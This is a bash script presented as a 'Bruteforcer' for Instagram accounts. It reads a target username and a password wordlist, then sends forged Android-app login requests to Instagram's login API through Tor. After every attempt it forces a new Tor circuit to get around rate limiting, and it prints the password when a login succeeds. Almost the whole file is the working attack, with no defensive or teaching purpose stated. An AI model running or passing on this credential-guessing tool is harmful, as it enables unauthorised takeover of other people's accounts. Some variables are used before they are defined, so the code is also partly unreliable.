#!/bin/bash

#colors
green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\033[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightcyan='\033[1;36m'
lightred='\e[101m'
blink='\e[5m'
magenta='\e[35m'
Blue='\033[0;34m'
grey='\033[0;37m'

#variablen

counter=0
startline=1
endline=1
token=0

clear

echo ""
echo -e " $red        _____         _       ___                      $farblos "
echo -e " $red       | __  |___ _ _| |_ ___|  _|___ ___ ___ ___ ___  $farblos "
echo -e " $red       | __ -|  _| | |  _| -_|  _| . |  _|  _| -_|  _| $farblos "
echo -e " $red       |_____|_| |___|_| |___|_| |___|_| |___|___|_|   $farblos "
echo -e "                               .___. "
echo -e "           /)               ,-^     ^-.  "
echo -e "          //               /           \ "
echo -e "  -------| |--------------/ $red __     __ $farblos \-------------------.__ "
echo -e " |WMWMWMW| |>>>>>>>>>>>>> | $red/>>\   />>\ $farblos|>>>>>>>>>>>>>>>>>>>>>>:> "
echo -e "  -------| |--------------| $red\__/   \__/ $farblos|--------------------^^ "
echo -e "          \\               \     /|\    / "
echo -e "           \)               \   \_/   / "
echo -e "                             |$BlueF+H+H+H+$farblos| "
echo -e "                             \       / "
echo -e "                              ^-----^	"
pwfound(){

echo -e "$lightcyan[$green*$lightcyan]$green Password found$red! $farblos "
echo -e "$lightcyan[$green+$lightcyan]$Blue Username: $user $farblos "
echo -e "$lightcyan[$green+$lightcyan]$Blue Password: $pass $farblos "

exit

}

check_tor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
if [[ "$check" -gt 0 ]]; then 
    sleep 1
    echo -e "$lightcyan[$red!$lightcyan]$red Check your TOR Connection! $farblos "
    sleep 2
    clear
    exit 
fi 

}

echo ""
read -p $'\033[1;36m[\033[1;32m+\033[1;36m]\033[0;34m Username: \e[0m' user
read -p $'\033[1;36m[\033[1;32m+\033[1;36m]\033[0;34m Wordlist: \e[0m' wl
echo ""
counter=$(wc -w $wl | cut -d " " -f1)
echo -e "$lightcyan[$green*$lightcyan]$BlueF$counter passwords loaded $farblos"
check_tor
while [ "$token" -lt "10" ]; do
for pass in $( sed -n ''$startline','$endline'p' $wl); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
IFS=$'\n'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
string4=$(openssl rand -hex 32 | cut -c 1-4)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
phone="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
guid="$string8-$string4-$string4-$string4-$string12"

echo -e "$lightcyan[$green+$lightcyan]$Blue Try pass $red$pass \n"

IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" );
if [[ $var == "challenge" ]]; then pwfound ; elif [[ $var == "logged_in_user" ]]; then pwfound ; elif [[ $var == "Please wait" ]]; then echo -e "$red Please wait $farblos" ; sleep 120 ; fi ;

let counter++
let startline+=1
let endline+=1
killall -HUP tor
done
done
